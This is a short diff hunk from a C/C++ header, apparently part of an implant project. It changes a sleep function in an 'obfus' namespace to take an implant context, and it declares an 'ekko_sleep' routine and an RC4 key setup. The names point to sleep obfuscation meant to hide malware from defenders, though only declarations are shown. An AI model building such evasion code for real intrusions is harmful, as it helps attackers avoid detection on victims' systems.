@@ -12,7 +12,7 @@
 
 namespace obfus {
     void ekko_sleep(uint32_t sleep_time);
-    void sleep(uint32_t sleep_time);
+    void sleep(const implant_context& ctx);
 }
 
 void init_rc4_key(USTRING* pKey);
